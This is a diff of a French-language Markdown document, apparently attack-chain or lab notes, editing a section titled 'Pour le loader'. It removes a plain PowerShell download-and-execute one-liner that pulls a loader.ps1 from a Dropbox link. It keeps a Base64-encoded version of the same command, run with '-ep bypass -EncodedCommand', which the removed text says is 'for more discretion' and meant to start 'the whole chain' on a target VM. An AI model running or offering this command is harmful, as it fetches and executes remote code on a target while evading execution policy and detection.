@@ -14,20 +14,10 @@
 
 **3) Pour le loader**
 
-    ```
-    Voici la commande PowerShell pour lancer le loader directement depuis Dropbox :
-
-    ```powershell
-    iex (iwr -UseBasicParsing 'https://www.dropbox.com/scl/fi/0w40f8y72fhvfgmnwja83/loader.ps1?rlkey=fl5hjyp9ia0a9v228734vrnck&st=dgcebmxk&dl=1')
-    ```
-
-    Et en version encodée pour plus de discrétion :
+    Version encodée :
 
     ```powershell
     powershell.exe -ep bypass -EncodedCommand ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("iex (iwr -UseBasicParsing 'https://www.dropbox.com/scl/fi/0w40f8y72fhvfgmnwja83/loader.ps1?rlkey=fl5hjyp9ia0a9v228734vrnck&st=dgcebmxk&dl=1')")))
-    ```
-
-    Tu peux utiliser l’une ou l’autre sur ta VM cible pour démarrer toute la chaîne.
     ```
 
 ## Table des liens
